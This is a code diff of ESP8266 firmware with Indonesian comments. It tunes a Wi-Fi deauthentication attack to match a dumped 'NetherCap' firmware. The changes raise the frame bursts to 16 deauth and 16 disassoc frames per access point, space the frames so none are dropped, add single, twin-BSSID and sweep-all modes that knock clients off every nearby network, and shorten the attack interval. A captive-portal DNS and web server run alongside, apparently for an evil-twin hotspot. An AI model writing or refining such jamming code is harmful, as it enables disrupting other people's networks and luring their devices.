@@ -681,8 +681,13 @@ void setup(){
   Serial.printf("[ZT] AP %s http://192.168.4.1\n", apSsid);
 }
 
-// Satu frame deauth/disassoc untuk satu BSSID.
-// reason: 1=unspecified, 2=auth invalid, 7=class3.
+// ============================================================================
+// Engine deauth — disamakan dengan firmware asli (FUN_4020abac di dump):
+//   * 16 frame per tipe (0xC0 lalu 0xA0), reason 0x0002
+//   * delay(1) di antara SETIAP frame: tanpa jeda, SDK membuang sebagian besar
+//     frame yang di-queue (ini yang bikin burst versi lama nyaris tidak keluar)
+//   * menyapu seluruh daftar AP tiap putaran untuk mode "semua"
+// ============================================================================
 void sendFrame(const uint8_t* bssid, uint8_t type, uint8_t reason){
   uint8_t f[26] = { type, 0x00, 0x00, 0x00,
                     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
@@ -695,73 +700,56 @@ void sendFrame(const uint8_t* bssid, uint8_t type, uint8_t reason){
   sentFrames++;
 }
 
-// Satu burst menembak SEMUA BSSID yang SSID-nya sama dengan target:
-// kasus nyata di lapangan, satu router memancarkan beberapa BSSID
-// (2.4 GHz, 5 GHz, repeater/mesh) sehingga client bisa nyangkut di BSSID lain.
+// Tembak satu BSSID: n frame deauth (reason 2) lalu n frame disassoc (reason 2).
+void hitAp(uint8_t idx, uint8_t n){
+  if(idx >= 16) return;
+  if(_networks[idx].ssid.length() == 0 || _networks[idx].ch == 0) return;
+  wifi_set_channel(_networks[idx].ch);
+  delay(1);
+  for(uint8_t k = 0; k < n; k++){ sendFrame(_networks[idx].bssid, 0xC0, 2); delay(1); }
+  for(uint8_t k = 0; k < n; k++){ sendFrame(_networks[idx].bssid, 0xA0, 2); delay(1); }
+}
+
+// Mode TUNGGAL: satu BSSID (baris yang diklik "Deauth").
+void deauthSingleStep(){
+  if(singleIdx < 0) return;
+  hitAp((uint8_t)singleIdx, 16);
+}
+
+// Mode TARGET: SSID terpilih + semua BSSID kembarannya (2.4G/5G/repeater).
 void deauthBurst(){
   uint8_t hit = 0;
-  for(int i = 0; i < 16 && hit < 4; i++){
+  for(uint8_t i = 0; i < 16 && hit < 4; i++){
     if(_networks[i].ssid != _selectedNetwork.ssid) continue;
-    if(_networks[i].ch == 0) continue;
-    wifi_set_channel(_networks[i].ch);
-    delay(4);                        // radio perlu settle setelah pindah kanal
-    sendFrame(_networks[i].bssid, 0xC0, 7);
-    sendFrame(_networks[i].bssid, 0xC0, 1);
-    sendFrame(_networks[i].bssid, 0xA0, 7);
-    sendFrame(_networks[i].bssid, 0xA0, 1);
-    sendFrame(_networks[i].bssid, 0xC0, 2);
+    hitAp(i, 16);
     hit++;
   }
-  if(hit == 0){                       // daftar scan kosong: tetap tembak target terpilih
+  if(hit == 0 && _selectedNetwork.ch){        // daftar scan kosong
     wifi_set_channel(_selectedNetwork.ch);
-    for(uint8_t r : { (uint8_t)7, (uint8_t)1, (uint8_t)2 }){
-      sendFrame(_selectedNetwork.bssid, 0xC0, r);
-      sendFrame(_selectedNetwork.bssid, 0xA0, r);
-    }
+    delay(1);
+    for(uint8_t k = 0; k < 16; k++){ sendFrame(_selectedNetwork.bssid, 0xC0, 2); delay(1); }
+    for(uint8_t k = 0; k < 16; k++){ sendFrame(_selectedNetwork.bssid, 0xA0, 2); delay(1); }
   }
-  // TIDAK kembali ke kanal 1 selama menyerang: firmware NetherCap asli juga
-  // parkir di kanal target, itu sebabnya deauth-nya kena device sekitar.
-  if(!deauthing_active) wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);
 }
 
-// Mode "deauth semua": tiap giliran tembak SATU AP (yang terdeteksi), bergilir.
-// Cakupan luas, tapi tiap AP kena lebih jarang dibanding mode fokus.
-// Mode tunggal: hanya satu BSSID (baris yang lu klik "Deauth").
-void deauthSingleStep(){
-  if(singleIdx < 0 || singleIdx >= 16) return;
-  if(_networks[singleIdx].ssid.length() == 0 || _networks[singleIdx].ch == 0) return;
-  wifi_set_channel(_networks[singleIdx].ch);
-  delay(4);
-  const uint8_t* b = _networks[singleIdx].bssid;
-  sendFrame(b, 0xC0, 7);
-  sendFrame(b, 0xC0, 1);
-  sendFrame(b, 0xA0, 7);
-  sendFrame(b, 0xA0, 1);
-  sendFrame(b, 0xC0, 2);
-}
-
+// Mode SEMUA: sapu seluruh daftar AP (maks 12 AP, 8 frame per tipe tiap AP).
 void deauthAllStep(){
-  for(uint8_t k = 0; k < 16; k++){
-    rrIdx = (rrIdx + 1) % 16;
-    if(_networks[rrIdx].ssid.length() == 0 || _networks[rrIdx].ch == 0) continue;
-    wifi_set_channel(_networks[rrIdx].ch);
-    delay(4);
-    sendFrame(_networks[rrIdx].bssid, 0xC0, 7);
-    sendFrame(_networks[rrIdx].bssid, 0xC0, 1);
-    sendFrame(_networks[rrIdx].bssid, 0xA0, 7);
-    sendFrame(_networks[rrIdx].bssid, 0xA0, 1);
-    sendFrame(_networks[rrIdx].bssid, 0xC0, 2);
-    return;
+  uint8_t hit = 0;
+  for(uint8_t i = 0; i < 16 && hit < 12; i++){
+    if(_networks[i].ssid.length() == 0 || _networks[i].ch == 0) continue;
+    hitAp(i, 8);
+    hit++;
   }
 }
 
 void loop(){
 
+
   dnsServer.processNextRequest();
   webServer.handleClient();
   handleButtons();
 
-  if(deauthing_active && (deauthAll || _selectedNetwork.ssid.length()) && millis() - deauth_now >= 400){
+  if(deauthing_active && (deauthAll || _selectedNetwork.ssid.length()) && millis() - deauth_now >= 150){
     if(singleIdx >= 0)  deauthSingleStep();
     else if(deauthAll)  deauthAllStep();
     else                deauthBurst();
